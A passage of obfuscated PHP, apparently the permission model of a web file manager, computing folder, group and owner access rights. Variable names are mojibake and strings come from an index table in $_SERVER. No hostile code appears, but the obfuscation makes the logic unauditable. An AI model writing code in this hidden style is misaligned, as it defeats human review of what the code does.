$this->sourceListAuth($…Æƒ–); } private function sourceListAuth($ª¥åñë™) { $¨‘Ã¬§ =& $_SERVER[¥Ÿ©ÒèÌ]; $¤±†Ìí¤ = Model($¨‘Ã¬§[1311])->sourceListInfo($ª¥åñë™, !0); $”Ø¡ÖöŒ = $this->sourceAuthSelect($ª¥åñë™); $ùêÒ´´ = array(); $œÊ‹‹© = array(); foreach ($¤±†Ìí¤ as $ÆÆÙÆ¥ƒ) { unset($ÆÆÙÆ¥ƒ[$¨‘Ã¬§[454]]); unset($ÆÆÙÆ¥ƒ[$¨‘Ã¬§[452]]); unset($ÆÆÙÆ¥ƒ[$¨‘Ã¬§[414]]); unset($ÆÆÙÆ¥ƒ[$¨‘Ã¬§[87]]); $Â Ş£ï = $”Ø¡ÖöŒ[$ÆÆÙÆ¥ƒ[$¨‘Ã¬§[403]]]; if (!$Â Ş£ï) { continue; } $ÆÆÙÆ¥ƒ[$¨‘Ã¬§[1982]] = $this->authTargetInfo($Â Ş£ï); $ÆÆÙÆ¥ƒ[$¨‘Ã¬§[519]] = rtrim($ÆÆÙÆ¥ƒ[$¨‘Ã¬§[525]], $¨‘Ã¬§[8]) . $¨‘Ã¬§[8] . ltrim($ÆÆÙÆ¥ƒ[$¨‘Ã¬§[519]], $¨‘Ã¬§[8]); $ùêÒ´´[] = $ÆÆÙÆ¥ƒ; $®×’ƒØ = count(explode($¨‘Ã¬§[8], trim($ÆÆÙÆ¥ƒ[$¨‘Ã¬§[519]], $¨‘Ã¬§[8]))); $œÊ‹‹©[] = $®×’ƒØ + ($ÆÆÙÆ¥ƒ[$¨‘Ã¬§[33]] == $¨‘Ã¬§[79] ? 0 : 1000); } array_multisort($œÊ‹‹©, SORT_ASC, $ùêÒ´´); return $ùêÒ´´; } private function groupChidldAllRootSource($ãÚ·¸¥¾) { $¯¿æÇñç =& $_SERVER[¥Ÿ©ÒèÌ]; $§Ê²£™× = Model($¯¿æÇñç[1983])->groupChildrenAll($ãÚ·¸¥¾); $Ûæˆ‚ = array($¯¿æÇñç[498] => 0, $¯¿æÇñç[504] => array($¯¿æÇñç[7], $§Ê²£™×), $¯¿æÇñç[412] => SourceModel::TYPE_GROUP); $à¤ğ‘òå = Model($¯¿æÇñç[815])->field($¯¿æÇñç[403])->where($Ûæˆ‚)->select(); $à¤ğ‘òå = array_to_keyvalue($à¤ğ‘òå, $¯¿æÇñç[12], $¯¿æÇñç[403]); return $à¤ğ‘òå; } private function authTargetInfo($ §„Ï¬™) { $û¹°†‘¬ =& $_SERVER[¥Ÿ©ÒèÌ]; $“ëîØ†² = array(); $—Ş”Ó–é = array(); $ëæİ„†ğ = 2 << 25; foreach ($ §„Ï¬™ as $©©·Äš¦) { $¡³ûºº– = Model($û¹°†‘¬[507])->listData($©©·Äš¦[$û¹°†‘¬[1908]]); if (!$¡³ûºº–) { continue; } if ($©©·Äš¦[$û¹°†‘¬[412]] == SourceModel::TYPE_USER) { $àúÕ¸¾– = Model($û¹°†‘¬[513])->getInfoSimpleOuter($©©·Äš¦[$û¹°†‘¬[504]]); if ($àúÕ¸¾–[$û¹°†‘¬[1639]] == $û¹°†‘¬[1174]) { continue; } if ($àúÕ¸¾–[$û¹°†‘¬[1639]] == $û¹°†‘¬[190]) { $àúÕ¸¾–[$û¹°†‘¬[32]] = LNG($û¹°†‘¬[1984]); } } else { $àúÕ¸¾– = Model($û¹°†‘¬[522])->getInfoSimple($©©·Äš¦[$û¹°†‘¬[504]]); } if (!$àúÕ¸¾–) { continue; } $àúÕ¸¾–[$û¹°†‘¬[466]] = $¡³ûºº–; $“ëîØ†²[] = $àúÕ¸¾–; $ÕãÎ±¤Ç = 0; if ($©©·Äš¦[$û¹°†‘¬[412]] == SourceModel::TYPE_GROUP) { $ÕãÎ±¤Ç = $ëæİ„†ğ * 2; } if ($©©·Äš¦[$û¹°†‘¬[412]] == SourceModel::TYPE_USER) { $ÕãÎ±¤Ç = $ëæİ„†ğ; } if ($©©·Äš¦[$û¹°†‘¬[412]] == SourceModel::TYPE_USER && $©©·Äš¦[$û¹°†‘¬[504]] == $û¹°†‘¬[190]) { $ÕãÎ±¤Ç = 0; } $—Ş”Ó–é[] = $¡³ûºº–[$û¹°†‘¬[414]] + $ÕãÎ±¤Ç; } array_multisort($—Ş”Ó–é, SORT_DESC, $“ëîØ†²); return $“ëîØ†²; } public function getAllChildrenByUser($é°ş°öÜ, $²òòõÂ) { $Ä×ŒÅ¾Î =& $_SERVER[¥Ÿ©ÒèÌ]; $¯¹º¡‹Ã = Model($Ä×ŒÅ¾Î[538])->getInfo($²òòõÂ); if (!$²òòõÂ || !$é°ş°öÜ || !$¯¹º¡‹Ã) { return array(); } $¹ö”ØŠ‹ = Model($Ä×ŒÅ¾Î[1311])->sourceInfo($é°ş°öÜ); $ú £Îˆ« = array(); $—Ô¨Ü­Ú = 1; if ($¹ö”ØŠ‹[$Ä×ŒÅ¾Î[498]] == $Ä×ŒÅ¾Î[190] && $¹ö”ØŠ‹[$Ä×ŒÅ¾Î[504]] != $—Ô¨Ü­Ú && $this->groupContainUser($¹ö”ØŠ‹[$Ä×ŒÅ¾Î[504]], $²òòõÂ)) { foreach ($¯¹º¡‹Ã[$Ä×ŒÅ¾Î[1985]] as $ÎœÎ‹ªà) { $¾ ¶¢ˆÙ = Model($Ä×ŒÅ¾Î[522])->getInfo($ÎœÎ‹ªà[$Ä×ŒÅ¾Î[1807]]); $’¯ì•ê = Model($Ä×ŒÅ¾Î[538])->getInfoSimpleOuter($²òòõÂ); $’¯ì•ê[$Ä×ŒÅ¾Î[466]] = $ÎœÎ‹ªà[$Ä×ŒÅ¾Î[414]]; if (Model($Ä×ŒÅ¾Î[507])->authCheckAction($ÎœÎ‹ªà[$Ä×ŒÅ¾Î[414]][$Ä×ŒÅ¾Î[414]], $Ä×ŒÅ¾Î[1827])) { continue; } $³Ï¤ÑÎ = array($Ä×ŒÅ¾Î[32] => $Ä×ŒÅ¾Î[1588] . $¾ ¶¢ˆÙ[$Ä×ŒÅ¾Î[32]], $Ä×ŒÅ¾Î[403] => $¾ ¶¢ˆÙ[$Ä×ŒÅ¾Î[87]][$Ä×ŒÅ¾Î[403]], $Ä×ŒÅ¾Î[78] => KodIO::make($¾ ¶¢ˆÙ[$Ä×ŒÅ¾Î[87]][$Ä×ŒÅ¾Î[403]]), $Ä×ŒÅ¾Î[498] => $Ä×ŒÅ¾Î[190], $Ä×ŒÅ¾Î[412] => $Ä×ŒÅ¾Î[515], $Ä×ŒÅ¾Î[33] => $Ä×ŒÅ¾Î[548], $Ä×ŒÅ¾Î[519] => $¾ ¶¢ˆÙ[$Ä×ŒÅ¾Î[526]], $Ä×ŒÅ¾Î[1807] => $¾ ¶¢ˆÙ[$Ä×ŒÅ¾Î[1807]], $Ä×ŒÅ¾Î[523] => $¾ ¶¢ˆÙ[$Ä×ŒÅ¾Î[498]], $Ä×ŒÅ¾Î[1982] => array($’¯ì•ê)); $ú £Îˆ«[$³Ï¤ÑÎ[$Ä×ŒÅ¾Î[403]]] = $³Ï¤ÑÎ; } } $´š†õØİ = array(); $ï×å¼Ğ = $this->getAllChildren($é°ş°öÜ); foreach ($ï×å¼Ğ as $°š û®) { $ïÂğå¾Ì = !1; foreach ($°š û®[$Ä×ŒÅ¾Î[1982]] as $ß£¾‡¡) { if ($ß£¾‡¡[$Ä×ŒÅ¾Î[1639]]) { if ($ß£¾‡¡[$Ä×ŒÅ¾Î[1639]] == $²òòõÂ) { $ïÂğå¾Ì = !0; break; } } if ($ß£¾‡¡[$Ä×ŒÅ¾Î[1807]]) { if ($this->groupContainUser($ß£¾‡¡[$Ä×ŒÅ¾Î[1807]], $²òòõÂ)) { $ïÂğå¾Ì = !0; break; } } } if ($ïÂğå¾Ì) { $´š†õØİ[] = $°š û®; } $€Æ‘À¥¼ = $°š û®[$Ä×ŒÅ¾Î[403]]; if (isset($ú £Îˆ«[$€Æ‘À¥¼])) { $°š û®[$Ä×ŒÅ¾Î[1982]][] = $ú £Îˆ«[$€Æ‘À¥¼][0]; $ú £Îˆ«[$€Æ‘À¥¼] = !1; } } $ú £Îˆ« = array_filter(array_values($ú £Îˆ«)); $´š†õØİ = array_merge($ú £Îˆ«, $´š†õØİ); return $´š†õØİ; } public function setAllChildrenByUser($òğŞ‹Ï, $—Òá¸’, $®Ã©°ı—) { $¨‰Òé’ =& $_SERVER[¥Ÿ©ÒèÌ]; $ü¼àÔ¥ğ = $this->getAllChildrenByUser($òğŞ‹Ï, $—Òá¸’); if (!$®Ã©°ı— || !$ü¼àÔ¥ğ) { return !1; } foreach ($ü¼àÔ¥ğ as $°ã´Î ) { $»Ø¹íå± = array(); foreach ($°ã´Î [$¨‰Òé’[1982]] as $İÃ§Âƒá) { $Ñß¥¶ƒï = $İÃ§Âƒá[$¨‰Òé’[466]]; $Öõ†á³ª = $İÃ§Âƒá[$¨‰Òé’[1639]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $·”ŠÄœ¹ = $İÃ§Âƒá[$¨‰Òé’[1639]] ? $İÃ§Âƒá[$¨‰Òé’[1639]] : $İÃ§Âƒá[$¨‰Òé’[1807]]; if ($İÃ§Âƒá[$¨‰Òé’[1639]] && $İÃ§Âƒá[$¨‰Òé’[1639]] == $—Òá¸’) { continue; } $»Ø¹íå±[] = array($¨‰Òé’[403] => $°ã´Î [$¨‰Òé’[403]], $¨‰Òé’[412] => $Öõ†á³ª, $¨‰Òé’[504] => intval($·”ŠÄœ¹), $¨‰Òé’[1908] => isset($Ñß¥¶ƒï[$¨‰Òé’[401]]) ? intval($Ñß¥¶ƒï[$¨‰Òé’[401]]) : 0, $¨‰Òé’[1962] => isset($Ñß¥¶ƒï[$¨‰Òé’[1962]]) ? intval($Ñß¥¶ƒï[$¨‰Òé’[1962]]) : -1); } $»Ø¹íå±[] = array($¨‰Òé’[403] => $°ã´Î [$¨‰Òé’[403]], $¨‰Òé’[412] => SourceModel::TYPE_USER, $¨‰Òé’[504] => intval($—Òá¸’), $¨‰Òé’[1908] => intval($®Ã©°ı—), $¨‰Òé’[1962] => -1); $this->where(array($¨‰Òé’[418] => $°ã´Î [$¨‰Òé’[403]]))->delete(); $this->addAll($»Ø¹íå±); } return !0; } public function get($™õ¼æ¯) { $®Ä¦©¶ = $this->getSourceList(array($™õ¼æ¯), !0); return $®Ä¦©¶[0]; } public function getSourceList($·±÷ÚÀ, $³»Î•® = false, $Ù‡µÌ³Ó = false) { $‘¶›×Ÿ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$·±÷ÚÀ) { return array(); } $º‰ÇòÒ = Model($‘¶›×Ÿ[1311]); if (!$³»Î•® && count($·±÷ÚÀ) == 1) { $³»Î•® = array(); $³»Î•®[$·±÷ÚÀ[0]] = $º‰ÇòÒ->sourceInfo($·±÷ÚÀ[0]); } if (!$³»Î•®) { $÷«ñóÃ = array($‘¶›×Ÿ[418] => array($‘¶›×Ÿ[419], $·±÷ÚÀ)); $³»Î•® = $º‰ÇòÒ->field($‘¶›×Ÿ[1986])->where($÷«ñóÃ)->select(); $³»Î•® = array_to_keyvalue($³»Î•®, $‘¶›×Ÿ[403]); } $Š©õË¾§ = $·±÷ÚÀ; foreach ($³»Î•® as $…ó¤¯ç± => $Øº¯ŠÇ—) { $È˜‡Ë¥¦ = $º‰ÇòÒ->parentLevelArray($Øº¯ŠÇ—[$‘¶›×Ÿ[521]]); $Š©õË¾§ = array_merge($Š©õË¾§, array($…ó¤¯ç±), array_reverse($È˜‡Ë¥¦)); } $Š©õË¾§ = array_values(array_unique($Š©õË¾§)); if (!$Š©õË¾§) { return array(); } $°êÁëÚ¿ = $this->sourceAuthSelect($Š©õË¾§); $±ÈÔü•š = array(); foreach ($Š©õË¾§ as $¥şµ¬‚á) { if (isset($°êÁëÚ¿[$¥şµ¬‚á])) { $±ÈÔü•š[$¥şµ¬‚á] = $°êÁëÚ¿[$¥şµ¬‚á]; } } $ÊƒæŒ° = $this->userIsRoot($Ù‡µÌ³Ó); $»¢íŠ¿Ø = AuthModel::authAll(); $úã°³¶¨ = array($‘¶›×Ÿ[415] => $»¢íŠ¿Ø, $‘¶›×Ÿ[1987] => array($‘¶›×Ÿ[420] => 0, $‘¶›×Ÿ[1813] => $»¢íŠ¿Ø, $‘¶›×Ÿ[421] => LNG($‘¶›×Ÿ[1988]), $‘¶›×Ÿ[1829] => $‘¶›×Ÿ[1989])); $Ã‡ÂâÚ“ = array(); foreach ($³»Î•® as $¥şµ¬‚á => $“Ÿ®’ü) { if ($ÊƒæŒ°) { $Ã‡ÂâÚ“[$¥şµ¬‚á] = $úã°³¶¨; continue; } $Ã‡ÂâÚ“[$¥şµ¬‚á] = $this->makeSourceAuth($“Ÿ®’ü, $±ÈÔü•š, $Ù‡µÌ³Ó); } return $Ã‡ÂâÚ“; } public function authDeepCheck($…†ÅñÉ‰, $åÏ°èĞ = false) { $ÆÊÇíûÔ =& $_SERVER[¥Ÿ©ÒèÌ]; $åÏ°èĞ = $åÏ°èĞ ? $åÏ°èĞ : USER_ID; $‚šÌÈÒ¨ = $this->makeAuthDeep($åÏ°èĞ); if (!in_array($…†ÅñÉ‰, $‚šÌÈÒ¨[$ÆÊÇíûÔ[1990]])) { return !1; } $¾¥ˆÉú¡ = array(); foreach ($‚šÌÈÒ¨[$ÆÊÇíûÔ[1991]] as $í§ˆáÈ¥ => $îîÉŞˆÙ) { if (!in_array($…†ÅñÉ‰, $îîÉŞˆÙ)) { continue; } $¾¥ˆÉú¡[] = $í§ˆáÈ¥; } if (!$¾¥ˆÉú¡) { return !1; } $øÔá¡Şé = $¾¥ˆÉú¡ ? $¾¥ˆÉú¡[0] : $…†ÅñÉ‰; return array($ÆÊÇíûÔ[415] => -1, $ÆÊÇíûÔ[466] => array($ÆÊÇíûÔ[420] => $ÆÊÇíûÔ[1174], $ÆÊÇíûÔ[1813] => $ÆÊÇíûÔ[190], $ÆÊÇíûÔ[421] => LNG($ÆÊÇíûÔ[1992]), $ÆÊÇíûÔ[1829] => $ÆÊÇíûÔ[1993]), $ÆÊÇíûÔ[1994] => LNG($ÆÊÇíûÔ[1995]), $ÆÊÇíûÔ[1996] => $this->sourceAuthInfo($øÔá¡Şé)); } protected function makeAuthDeep($ÖÊÊœË = false) { $î‹ıßèè =& $_SERVER[¥Ÿ©ÒèÌ]; static $Ç¥‘Ã’ = array(); $ÖÊÊœË = $ÖÊÊœË ? $ÖÊÊœË : USER_ID; if (isset($Ç¥‘Ã’[$ÖÊÊœË])) { return $Ç¥‘Ã’[$ÖÊÊœË]; } $¥‡Ìé®† = Model($î‹ıßèè[1997])->listData(); $ÑÕ˜ÈßŠ = array(); foreach ($¥‡Ìé®† as $Çîêûš³) { if ($Çîêûš³[$î‹ıßèè[414]] == 0 && $Çîêûš³[$î‹ıßèè[1828]] == $î‹ıßèè[89]) { $ÑÕ˜ÈßŠ[] = $Çîêûš³[$î‹ıßèè[401]]; } } $¦¡úŒıü = $this->userGroupParents($ÖÊÊœË); $Òâ¶õŒ = array($î‹ıßèè[412] => SourceModel::TYPE_USER, $î‹ıßèè[504] => $ÖÊÊœË); if ($¦¡úŒıü) { $Òâ¶õŒ = array(array($î‹ıßèè[412] => SourceModel::TYPE_USER, $î‹ıßèè[504] => $ÖÊÊœË), array($î‹ıßèè[412] => SourceModel::TYPE_GROUP, $î‹ıßèè[504] => array($î‹ıßèè[419], $¦¡úŒıü)), $î‹ıßèè[986] => $î‹ıßèè[1902]); } $–Êö§Šş = $this->field($î‹ıßèè[1998])->where($Òâ¶õŒ)->select(); $ßîåÅé” = array(); $ÇòÅŞ›¸ = array_to_keyvalue_group($–Êö§Šş, $î‹ıßèè[403]); foreach ($ÇòÅŞ›¸ as $ ºŠ÷Äï => $Ò¦ñ°…Œ) { $õıó‹ = $this->authArrayCheck($Ò¦ñ°…Œ, $ÖÊÊœË); if ($õıó‹[$î‹ıßèè[415]] > 0) { $ßîåÅé”[] = $ ºŠ÷Äï . $î‹ıßèè[12]; } } if ($¦¡úŒıü) { $Å¦ûÒâ  = Model($î‹ıßèè[522]); foreach ($¦¡úŒıü as $õªÂ±‰Å) { $°Õ•‚‚Ÿ = $Å¦ûÒâ ->getInfo($õªÂ±‰Å); if (!$°Õ•‚‚Ÿ || !is_array($°Õ•‚‚Ÿ[$î‹ıßèè[87]])) { continue; } $ßîåÅé”[] = $°Õ•‚‚Ÿ[$î‹ıßèè[87]][$î‹ıßèè[403]]; } } $Ìã°€¾¢ = array(); $¹ˆüª°± = $¦¡úŒıü; $’›ô ã‰ = Model($î‹ıßèè[1311]); $Å¦ûÒâ  = Model($î‹ıßèè[522]); $ÔŠºòÛ¾ = array(); $Ğóîô¢À = array(); $°ö–ÉÀ = array(); $íÖÄşÒ = array(); if ($ßîåÅé”) { $ç¦îüËâ = $’›ô ã‰->where(array($î‹ıßèè[403] => array($î‹ıßèè[419], $ßîåÅé”)))->select(); foreach ($ç¦îüËâ as $®¿Ğ’Ü°) { $‹—µ´· = $’›ô ã‰->parentLevelArray($®¿Ğ’Ü°[$î‹ıßèè[521]]); $Ìã°€¾¢ = array_merge($Ìã°€¾¢, $‹—µ´·); $¹ˆüª°±[] = $®¿Ğ’Ü°[$î‹ıßèè[504]]; $ÔŠºòÛ¾[$®¿Ğ’Ü°[$î‹ıßèè[403]]] = $‹—µ´·; $Ğóîô¢À[$®¿Ğ’Ü°[$î‹ıßèè[403]]] = $®¿Ğ’Ü°[$î‹ıßèè[504]]; } } $¹ˆüª°± = array_values(array_unique($¹ˆüª°±)); $¼ë÷Üèš = $¹ˆüª°±; foreach ($¼ë÷Üèš as $õªÂ±‰Å) { $°Õ•‚‚Ÿ = $Å¦ûÒâ ->getInfo($õªÂ±‰Å); $‹—µ´· = $’›ô ã‰->parentLevelArray($°Õ•‚‚Ÿ[$î‹ıßèè[521]]); $¹ˆüª°± = array_merge($¹ˆüª°±, $‹—µ´·); } $¹ˆüª°± = array_values(array_unique($¹ˆüª°±)); foreach ($¹ˆüª°± as $õªÂ±‰Å) { $°Õ•‚‚Ÿ = $Å¦ûÒâ ->getInfo($õªÂ±‰Å); $Ìã°€¾¢[] = $°Õ•‚‚Ÿ[$î‹ıßèè[87]][$î‹ıßèè[403]]; $°ö–ÉÀ[$õªÂ±‰Å] = $°Õ•‚‚Ÿ[$î‹ıßèè[87]][$î‹ıßèè[403]]; $íÖÄşÒ[$õªÂ±‰Å] = $’›ô ã‰->parentLevelArray($°Õ•‚‚Ÿ[$î‹ıßèè[521]]); } foreach ($ÔŠºòÛ¾ as $á£âü°Î => $»ÇĞ’Ú) { $ê¤ó±Æ˜ = $Ğóîô¢À[$á£âü°Î]; if (!$ê¤ó±Æ˜ || !$°ö–ÉÀ[$ê¤ó±Æ˜]) { continue; } $±Ó’×ã¼ = array(); foreach ($íÖÄşÒ[$ê¤ó±Æ˜] as $õªÂ±‰Å) { $±Ó’×ã¼[] = $°ö–ÉÀ[$õªÂ±‰Å]; } $ÔŠºòÛ¾[$á£âü°Î] = array_merge($±Ó’×ã¼, $»ÇĞ’Ú); } $Ìã°€¾¢ = array_values(array_unique($Ìã°€¾¢)); $¤µÕÑŒÀ = array($î‹ıßèè[1990] => $Ìã°€¾¢, $î‹ıßèè[1991] => $ÔŠºòÛ¾); $Ç¥‘Ã’[$ÖÊÊœË] = $¤µÕÑŒÀ; return $¤µÕÑŒÀ; } private function makeSourceAuth($×°şÂçŒ, $‰‰¶ûˆ—, $óìğü™ñ = false) { $İ™°¬ =& $_SERVER[¥Ÿ©ÒèÌ]; $Ğ­œêá¤ = $İ™°¬[89]; $áöØ¨Ï = $×°şÂçŒ[$İ™°¬[504]]; $çŠ¨À¹ = $×°şÂçŒ[$İ™°¬[412]] == SourceModel::TYPE_GROUP; $®ÕïÀ‡Î = $çŠ¨À¹ ? $this->groupRootAuth($áöØ¨Ï, $óìğü™ñ) : !1; if ($®ÕïÀ‡Î && Model($İ™°¬[507])->authCheckAction($®ÕïÀ‡Î[$İ™°¬[414]], $İ™°¬[1827])) { return $this->groupAuthInfo($®ÕïÀ‡Î, $áöØ¨Ï); } $¬ù”¶ÙÑ = Model($İ™°¬[1311])->parentLevelArray($×°şÂçŒ[$İ™°¬[521]]); $¬ù”¶ÙÑ = array_merge(array($×°şÂçŒ[$İ™°¬[403]]), array_reverse($¬ù”¶ÙÑ)); $–î€áñ» = !1; foreach ($¬ù”¶ÙÑ as $§İıñÔà) { if (!isset($‰‰¶ûˆ—[$§İıñÔà])) { continue; } $ãÈÒÑ– = $this->authMake($‰‰¶ûˆ—[$§İıñÔà], $óìğü™ñ); if ($ãÈÒÑ–[$İ™°¬[466]]) { $–î€áñ» = $ãÈÒÑ–; break; } } if (!$çŠ¨À¹) { return $–î€áñ»; } if (!$–î€áñ» && $®ÕïÀ‡Î) { $–î€áñ» = $this->groupAuthInfo($®ÕïÀ‡Î, $áöØ¨Ï); } if (!$–î€áñ») { $€ÆËä„ğ = Model($İ™°¬[522])->getInfo($áöØ¨Ï); $ö¯ËŞ¡• = explode($İ™°¬[50], trim($€ÆËä„ğ[$İ™°¬[521]], $İ™°¬[50])); $ö¯ËŞ¡• = array_reverse($ö¯ËŞ¡•); foreach ($ö¯ËŞ¡• as $µşÀºù) { if ($µşÀºù == $İ™°¬[190] || $µşÀºù == $Ğ­œêá¤) { continue; } $ÆûÜ¡Å‡ = $this->groupRootAuth($µşÀºù, $óìğü™ñ); if (!$ÆûÜ¡Å‡) { continue; } $–î€áñ» = $this->groupAuthInfo($ÆûÜ¡Å‡, $µşÀºù); break; } } if (!$–î€áñ» || $–î€áñ»[$İ™°¬[415]] <= 0) { $õ¼ù’ˆ’ = $this->authDeepCheck($×°şÂçŒ[$İ™°¬[403]], $óìğü™ñ); if ($õ¼ù’ˆ’) { $–î€áñ» = $õ¼ù’ˆ’; } } return $–î€áñ»; } private function userIsRoot($Î’œ = false) { $Ç—Ë±úº =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$Î’œ && _get($GLOBALS, $Ç—Ë±úº[505])) { return !0; } $úË«İ¦¾ = Model($Ç—Ë±úº[538])->getInfo($Î’œ); $Í§ôì× = Model($Ç—Ë±úº[1999])->listData($úË«İ¦¾[$Ç—Ë±úº[1519]]); if ($Í§ôì× && $Í§ôì×[$Ç—Ë±úº[511]][$Ç—Ë±úº[2000]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ıÇğ†ˆÊ) { $¶¿È¥¿¨ =& $_SERVER[¥Ÿ©ÒèÌ]; $ºïˆãšÑ = Model($¶¿È¥¿¨[1311]); $äÛÁĞÉˆ = $ºïˆãšÑ->sourceInfo($ıÇğ†ˆÊ); if (!$äÛÁĞÉˆ) { return !1; } $ºïˆãšÑ->groupPathDisplay($äÛÁĞÉˆ); $·ÈŸŞ¡— = array($äÛÁĞÉˆ); $·ÈŸŞ¡— = $ºïˆãšÑ->_listAppendPath($·ÈŸŞ¡—); $äÛÁĞÉˆ = $·ÈŸŞ¡—[0]; $Ûµè·Ôœ = $äÛÁĞÉˆ[$¶¿È¥¿¨[519]]; if (isset($äÛÁĞÉˆ[$¶¿È¥¿¨[527]])) { $¥øïı’ = explode($¶¿È¥¿¨[8], trim($äÛÁĞÉˆ[$¶¿È¥¿¨[519]], $¶¿È¥¿¨[8])); array_shift($¥øïı’); $Ûµè·Ôœ = $äÛÁĞÉˆ[$¶¿È¥¿¨[525]] . $¶¿È¥¿¨[2001] . implode($¶¿È¥¿¨[8], $¥øïı’); } return array($¶¿È¥¿¨[421] => $äÛÁĞÉˆ[$¶¿È¥¿¨[32]], $¶¿È¥¿¨[78] => KodIO::make($äÛÁĞÉˆ[$¶¿È¥¿¨[403]]), $¶¿È¥¿¨[2002] => $Ûµè·Ôœ); } private function groupAuthInfo($§Šëı´Ÿ, $ÉŠšˆ) { $½ıº×› =& $_SERVER[¥Ÿ©ÒèÌ]; $£È™ÒŸ = Model($½ıº×›[522])->getInfo($ÉŠšˆ); return array($½ıº×›[2003] => intval($§Šëı´Ÿ[$½ıº×›[414]]), $½ıº×›[1987] => $§Šëı´Ÿ, $½ıº×›[2004] => LNG($½ıº×›[2005]), $½ıº×›[1996] => array($½ıº×›[421] => $£È™ÒŸ[$½ıº×›[32]], $½ıº×›[78] => KodIO::make($£È™ÒŸ[$½ıº×›[87]][$½ıº×›[403]]), $½ıº×›[2002] => $£È™ÒŸ[$½ıº×›[526]])); } protected function groupRootAuth($Ã²È¤Ñ, $Ìã¤€£– = false) { $Ÿ¹§·Š =& $_SERVER[¥Ÿ©ÒèÌ]; $Ìã¤€£– = $Ìã¤€£– ? $Ìã¤€£– : USER_ID; $‰ÅÎ¥Ğ = $Ìã¤€£– . $Ÿ¹§·Š[2006] . $Ã²È¤Ñ; static $æ°¾ÒŠ = array(); if (isset($æ°¾ÒŠ[$‰ÅÎ¥Ğ])) { return $æ°¾ÒŠ[$‰ÅÎ¥Ğ]; } $à§¬îÜÉ = Model($Ÿ¹§·Š[522])->getInfo($Ã²È¤Ñ); $÷ÆÂúĞ× = $this->userGroupList($Ìã¤€£–); $ÙÍ‹”± = isset($÷ÆÂúĞ×[$Ã²È¤Ñ]) ? $÷ÆÂúĞ×[$Ã²È¤Ñ][$Ÿ¹§·Š[414]] : !1; if ($ÙÍ‹”± && Model($Ÿ¹§·Š[507])->authCheckAction($ÙÍ‹”±[$Ÿ¹§·Š[414]], $Ÿ¹§·Š[1827])) { $æ°¾ÒŠ[$‰ÅÎ¥Ğ] = $ÙÍ‹”±; return $ÙÍ‹”±; } $Ë½éÙ…› = $this->sourceAuthSelect($à§¬îÜÉ[$Ÿ¹§·Š[87]][$Ÿ¹§·Š[403]]); $èİ‡•™Š = $Ë½éÙ…› ? $this->authMake($Ë½éÙ…›, $Ìã¤€£–) : !1; $¾Î¦Î® = $èİ‡•™Š ? $èİ‡•™Š[$Ÿ¹§·Š[466]] : !1; $æ°¾ÒŠ[$‰ÅÎ¥Ğ] = $¾Î¦Î® ? $¾Î¦Î® : $ÙÍ‹”±; return $æ°¾ÒŠ[$‰ÅÎ¥Ğ]; } public function authOwnerApply($ï‰ğó”ş) { $¶İŞğ³ =& $_SERVER[¥Ÿ©ÒèÌ]; if (empty($ï‰ğó”ş[$¶İŞğ³[414]]) || isset($ï‰ğó”ş[$¶İŞğ³[2007]]) && $ï‰ğó”ş[$¶İŞğ³[2007]]) { return $ï‰ğó”ş; } if (AuthModel::authCheckRoot($ï‰ğó”ş[$¶İŞğ³[414]][$¶İŞğ³[415]])) { return $ï‰ğó”ş; } $İ÷¡ìŠ = Model($¶İŞğ³[1311])->parentLevelArray($ï‰ğó”ş[$¶İŞğ³[521]]); $İ÷¡ìŠ = array_merge(array($ï‰ğó”ş[$¶İŞğ³[403]]), array_reverse($İ÷¡ìŠ)); $×ÌÓ‡ä = $this->sourceAuthSelect($İ÷¡ìŠ); $ÈÈ”¸²ˆ = array(); $èÏò˜““ = array(); foreach ($×ÌÓ‡ä as $Æ¤÷ƒ³Ñ => $„ÓØ ´Œ) { $…‚‰åº  = $this->authFolderOwnerUser($„ÓØ ´Œ); $ÈÈ”¸²ˆ[$Æ¤÷ƒ³Ñ] = $…‚‰åº ; $èÏò˜““ = array_merge($èÏò˜““, $…‚‰åº [$¶İŞğ³[594]]); if ($…‚‰åº [$¶İŞğ³[2008]]) { break; } } if (count($èÏò˜““) == 0) { $èÏò˜““ = $this->authFolderOwnerGroup($ï‰ğó”ş[$¶İŞğ³[504]]); } $èÏò˜““ = array_unique($èÏò˜““); if (AuthModel::authCheckRoot($ï‰ğó”ş[$¶İŞğ³[414]][$¶İŞğ³[415]])) { $èÏò˜““[] = USER_ID; } $ï‰ğó”ş[$¶İŞğ³[414]][$¶İŞğ³[2009]] = Model($¶İŞğ³[513])->userListInfo($èÏò˜““); return $ï‰ğó”ş; } private function authFolderOwnerGroup($É‰·õĞÈ) { $Üûø‹ƒó =& $_SERVER[¥Ÿ©ÒèÌ]; $Ğ¡Û™ö½ = Model($Üûø‹ƒó[1896])->where(array($Üûø‹ƒó[1807] => $É‰·õĞÈ))->select(); $­¯­™ö = array(); if (!$Ğ¡Û™ö½) { return $­¯­™ö; } foreach ($Ğ¡Û™ö½ as $ØìãÉœ) { $Ùªç£­ˆ = $this->authInfo($ØìãÉœ); if (AuthModel::authCheckRoot($Ùªç£­ˆ[$Üûø‹ƒó[414]])) { $­¯­™ö[] = $ØìãÉœ[$Üûø‹ƒó[1639]]; } } return $­¯­™ö; } private function authFolderOwnerUser($‹˜ÙùÓ¬) { $¸ÆÈ«“â =& $_SERVER[¥Ÿ©ÒèÌ]; $–ÌŒô¬ = array(); $û¤ÜÛ¿× = !1; foreach ($‹˜ÙùÓ¬ as $¸œ¹ßõ) { $ùŞËÜµ– = $this->authInfo($¸œ¹ßõ); if ($¸œ¹ßõ[$¸ÆÈ«“â[504]] == $¸ÆÈ«“â[190]) { $û¤ÜÛ¿× = !0; } if ($¸œ¹ßõ[$¸ÆÈ«“â[412]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($ùŞËÜµ–[$¸ÆÈ«“â[414]])) { $–ÌŒô¬[] = $¸œ¹ßõ[$¸ÆÈ«“â[504]]; } } } return array($¸ÆÈ«“â[594] => $–ÌŒô¬, $¸ÆÈ«“â[2008] => $û¤ÜÛ¿×); } public function authMake($à™Ç¢ ‚, $†¯Ÿø² = false) { $íçßùÂ¿ =& $_SERVER[¥Ÿ©ÒèÌ]; $„à½ÖËĞ = $this->authArrayCheck($à™Ç¢ ‚, $†¯Ÿø²); if ($„à½ÖËĞ[$íçßùÂ¿[2010]]) { $„à½ÖËĞ[$íçßùÂ¿[2010]] = 